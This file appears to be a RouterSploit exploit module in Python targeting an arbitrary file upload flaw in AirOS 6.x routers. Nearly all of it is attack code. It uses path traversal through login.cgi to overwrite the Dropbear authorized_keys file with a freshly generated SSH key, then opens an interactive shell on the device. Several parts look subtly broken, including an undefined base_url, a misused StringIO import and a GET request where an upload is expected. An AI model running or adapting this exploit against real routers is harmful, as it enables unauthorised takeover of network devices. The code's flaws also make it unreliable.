import tempfile
from io import StringIO
import paramiko
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient
from routersploit.core.ssh.ssh_client import SSHClient


class Exploit(HTTPClient, SSHClient):
    __info__ = {
        'name': 'AirOS 6.x - Arbitrary File Upload',
        'description': 'Exploit implementation for AirOS 6.x - Arbitrary File Upload. '
                       'If the target is vulnerable is possible to take full control of the router',
        'authors': (
            '93c08539',  # Vulnerability discovery
            'Vinicius Henrique Marangoni'  # routersploit module
        ),
        'references': (
            'https://hackerone.com/reports/73480',
            'https://www.exploit-db.com/exploits/39701/'
        ),
        'devices': (
            'AirOS 6.x'
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")
    ssl = OptBool("true", "SSL enabled: true/false")

    ssh_port = OptPort(22, "Target SSH Port")

    def run(self):
        if self.check():
            print_success('Target is vulnerable')
            print_success('Trying to exploit by uploading SSH public key')

            key = paramiko.RSAKey.generate(1024)
            public_key = key.get_base64()
            private_key = StringIO.StringIO()
            key.write_private_key(private_key)

            tmp_file_pubkey = tempfile.TemporaryFile()
            tmp_file_pubkey.write('ssh-rsa ' + public_key)
            tmp_file_pubkey.seek(0)

            upload_params = {'file': ('../../etc/dropbear/authorized_keys', tmp_file_pubkey, {'Expect': ''})}

            upload_url = '{0}:{1}/login.cgi' .format(self.target, self.port)
            response = http_request(url=upload_url, method='POST', files=upload_params)

            if response is None:
                print_error('Something was wrong while uploading the SSH Public Key')
                return

            print_success('Appareantly the exploit worked fine')
            print_success('Trying to invoke a interactive SSH Shell')

            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            pseudo_privkey_file = StringIO.StringIO(private_key.getvalue())
            pkey = paramiko.RSAKey.from_private_key(pseudo_privkey_file)
            pseudo_privkey_file.close()
            private_key.close()

            ip_target = self.target.replace('https://', '')
            ip_target = ip_target.replace('http://', '')
            ip_target = ip_target.replace('/', '')

            client.connect(ip_target, self.ssh_port, username='ubnt', pkey=pkey)
            ssh_interactive(client)

        else:
            print_error('Target is not vulnerable')

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/login.cgi"
        )

        if response is None:
            return False  # Target not vulnerable

        rand_str = utils.random_text(length=16)

        tmp_payload = tempfile.TemporaryFile()
        tmp_payload.write("vulnerable{}".format(rand_str).encode())
        tmp_payload.seek(0)

        upload_params = {'file': ('../../../../tmp/airview.uavr', tmp_payload, {'Expect': ''})}

        response = self.http_request(
            method="GET",
            path="/login.cgi",
            files=upload_params
        )

        tmp_payload.close()

        if response is None:
            return False  # Target not vulnerable

        # Response to verify if the upload was done correctly
        airview_url = base_url + 'airview.uavr'
        verify_upload = self.http_request(
            method="GET",
            path="airview.uavr"
        )

        # Upload empty file to "clear" the airview.uavr file
        clean_tmp_file = tempfile.TemporaryFile()
        clean_tmp_file.seek(0)

        upload_params = {'file': ('../../../../tmp/airview.uavr', clean_tmp_file, {'Expect': ''})}

        self.http_request(
            method="POST",
            path="/login.cgi",
            files=upload_params
        )

        clean_tmp_file.close()

        if "".join(('vulnerable', rand_str)) in verify_upload.text:
            return True
        else:
            return False
